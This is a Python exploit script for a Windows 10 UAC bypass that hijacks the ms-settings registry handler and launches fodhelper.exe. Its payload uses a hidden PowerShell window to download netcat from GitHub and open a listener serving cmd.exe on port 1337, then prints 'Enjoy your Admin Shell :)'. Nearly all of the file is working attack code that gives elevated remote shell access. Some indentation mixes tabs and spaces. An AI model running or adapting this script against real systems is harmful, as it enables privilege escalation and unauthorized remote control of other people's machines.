#!/usr/bin/env python
#
# Exploit Title: Windows 10 UAC Bypass by computerDefault
# Date: 2018-10-18
# Exploit Author: Fabien DROMAS - Security consultant @ Synetis <fabien.dromas[at]synetis[dot]com>
# Twitter: st0rnpentest
#
# Vendor Homepage: www.microsoft.com
# Version: Version 10.0.17134.285
# Tested on: Windows 10 pro Version 10.0.17134.285
#

import os
import sys
import ctypes
import _winreg


def create_reg_key(key, value):
    try:        
        _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command')
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command', 0, _winreg.KEY_WRITE)                
        _winreg.SetValueEx(registry_key, key, 0, _winreg.REG_SZ, value)        
        _winreg.CloseKey(registry_key)
    except WindowsError:        
        raise

def exec_bypass_uac(cmd):
    try:
        create_reg_key('DelegateExecute', '')
        create_reg_key(None, cmd)    
    except WindowsError:
        raise

def bypass_uac():        
 try:                
    current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
    cmd = "powershell -windowstyle hidden Start-BitsTransfer https://github.com/rahuldottech/netcat-for-windows/raw/master/1.12/nc.exe %appdata%/;%appdata%/nc.exe -lvp 1337 -e cmd.exe"
    exec_bypass_uac(cmd)                
    os.system(r'C:\windows\system32\fodhelper.exe')  
    return 1               
 except WindowsError:
    sys.exit(1)       

def delete_reg_key():
    try:        
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command', 0, _winreg.KEY_WRITE)
		_winreg.DeleteKey(registry_key,"")
	except WindowsError:        
        raise	
	
if __name__ == '__main__':

	if bypass_uac():
		print ("Enjoy your Admin Shell :)")
		delete_reg_key()

